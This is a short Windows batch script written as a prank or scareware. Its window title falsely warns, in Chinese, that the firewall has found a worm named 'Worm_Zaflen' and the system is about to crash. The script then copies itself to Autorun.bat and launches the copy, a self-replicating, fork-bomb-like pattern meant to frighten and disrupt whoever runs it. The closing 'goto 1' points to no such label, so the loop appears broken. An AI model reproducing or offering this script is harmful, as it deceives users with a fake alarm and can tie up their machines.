@echo off
color 9f
title=                     Window系统防火墙检测到蠕虫病毒：Ｗｏｒｍ＿Ｚａｆｌｅｎ，系统即将将崩溃！！！    
mode con cols=14 lines=1
:
copy %0 Autorun.bat
start Autorun.bat
goto 1
